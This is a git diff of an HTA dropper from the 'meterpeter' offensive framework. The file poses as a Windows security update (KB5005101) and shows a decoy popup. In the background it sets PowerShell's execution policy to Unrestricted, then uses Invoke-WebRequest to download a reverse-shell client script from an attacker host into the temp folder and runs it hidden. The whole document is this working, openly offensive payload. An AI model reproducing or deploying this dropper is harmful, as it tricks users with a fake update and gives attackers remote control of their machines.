@@ -1,18 +1,48 @@
 <!--
-   Author: @r00t-3xp10it
-   Framework: Meterpeter v2.10.10
+   Hta_Version: 1.0.1
+   Author: @r00t-3xp10it (ssa)
+   Application: meterpeter v2.10.10 dropper
+   
+   .DESCRIPTION
+      This HTA changes PS 'ExecutionPolicy' to 'UnRestricted', presents a msgbox
+      pretending to be a security KB5005101 21H1 update, while downloads\executes
+      meterpeter client.ps1 (rev_tcp_shell) in background from attacker werbserver.
+
+   .NOTES
+      Add our own icon to hta application:
+      PS C:\> cmd.exe /R COPY /B meterpeter.ico+Update.hta Update-KB5005101.hta
+      Remark: "we can not change the sourcecode after icon input or it will brake it"
 -->
 
-<title>KB5005101 Security Update</title>
-<H2><center><b><i>Feature update</b></i></center></H2>
-THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+<title>KB5005101 21H1 Security Update</title>
 
 <script>
    path = document.URL
    document.write(
-      '<HTA:APPLICATION ID="oHTA" APPLICATIONNAME="myApp" ICON="https://github.com/favicon.ico">'
+      '<HTA:APPLICATION ID="oHTA" APPLICATIONNAME="meterpeter" SHOWINTASKBAR="yes" ICON="https://github.com/favicon.ico">'
    );
-   a=new ActiveXObject("WScript.Shell");
-   a.run("powershell cd $Env:TMP;iwr -uri http://CharlieBrown/Update-KB5005101.ps1 -outfile Update-KB5005101.ps1;powershell -W 1 -File Update-KB5005101.ps1", 0);
+   Loki=new ActiveXObject("WScript.Shell");
+   Loki.run("cmd /R echo A|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser", 0);
+   Loki.run("powershell (New-Object -ComObject Wscript.Shell).Popup('THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.',8,'KB5005101 21H1 Security Update',0+0)", 0);
+   Loki.run("powershell cd $Env:TMP;iwr -Uri 'http://CharlieBrown/Update-KB5005101.ps1' -OutFile 'Update-KB5005101.ps1';powershell -W 1 -File 'Update-KB5005101.ps1'", 0);
    window.close();
 </script>
+
+<body bgColor="Grey"><center><H2><b><i>Update KB5005101_21H1 - Description</i></b></H2></center></body>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
